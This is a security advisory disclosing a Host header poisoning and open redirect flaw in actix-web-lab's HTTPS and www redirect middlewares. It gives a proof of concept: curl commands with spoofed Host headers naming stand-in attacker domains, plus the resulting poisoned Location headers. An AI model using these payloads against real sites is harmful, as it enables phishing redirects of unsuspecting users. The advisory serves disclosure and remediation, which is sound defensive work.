# [M] actix-web-lab has host header poisoning in redirect middleware can generate attacker-controlled absolute redirects

## Summary
Severity: Medium
Advisory: GHSA-vhj5-x93p-67jw
CWE: CWE-601
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-vhj5-x93p-67jw
Type: github-advisory

## Affected
- crates.io: `actix-web-lab` — affected >=0 <0.26.0

## Details
### Summary
`actix-web-lab` redirect middleware uses request-derived host information to construct absolute redirect URLs (for example, `https://{hostname}{path}`). In deployments without strict host allowlisting, an attacker can supply a malicious Host header and poison the `Location` response header, causing open redirect/phishing behavior.

### CVE
Assigned CVE ID:  CVE-2025-63762

### Details
The issue is in redirect middleware paths that construct absolute URLs from `req.connection_info()`:

1. `actix-web-lab/src/redirect_to_https.rs` (around lines 119-132)
   - `let host = conn_info.host();`
   - `format!("https://{hostname}{path}")`
   - `format!("https://{hostname}:{port}{path}")`

2. `actix-web-lab/src/redirect_to_www.rs` (around lines 30-35)
   - `format!("{scheme}://www.{host}{path}")`

3. `actix-web-lab/src/redirect_to_non_www.rs` (around lines 30-34)
   - `format!("{scheme}://{host_no_www}{path}")`

Because host values come from request connection metadata, untrusted Host input can influence redirect targets when deployment-side host validation is missing.

### PoC
Environment used for validation:
- Local minimal Actix apps using `actix-web-lab` middleware
- RedirectHttps: `http://127.0.0.1:18080`
- redirect_to_www: `http://127.0.0.1:18081`
- redirect_to_non_www: `http://127.0.0.1:18082`

Reproduction (RedirectHttps):
```bash
curl.exe -i -s "http://127.0.0.1:18080/test" -H "Host: attacker.example"
```

Observed response:
```http
HTTP/1.1 307 Temporary Redirect
location: https://attacker.example/test
```

Additional verification:
```bash
curl.exe -i -s "http://127.0.0.1:18080/abc/def" -H "Host: evil.example:9999"
```

Observed response:
```http
HTTP/1.1 307 Temporary Redirect
location: https://evil.example/abc/def
```

Reproduction (redirect_to_www):
```bash
curl.exe -i -s "http://127.0.0.1:18081/hello" -H "Host: attacker.example"
```

Observed response:
```http
HTTP/1.1 307 Temporary Redirect
location: http://www.attacker.example/hello
```

Reproduction (redirect_to_non_www):
```bash
curl.exe -i -s "http://127.0.0.1:18082/path" -H "Host: www.attacker.example"
```

Observed response:
```http
HTTP/1.1 307 Temporary Redirect
location: http://attacker.example/path
```

### Impact
This is a Host header poisoning / open redirect issue. Users can be redirected to attacker-controlled domains, enabling phishing and trust-boundary abuse. Any application using these middleware paths without strict host validation (proxy/app allowlisting) is impacted.

## References
- https://github.com/robjtede/actix-web-lab/security/advisories/GHSA-vhj5-x93p-67jw
- https://github.com/robjtede/actix-web-lab/pull/292
- https://github.com/robjtede/actix-web-lab/commit/142c28b82eb59b67445a859a2a9b75e01a9964ee
- https://github.com/robjtede/actix-web-lab
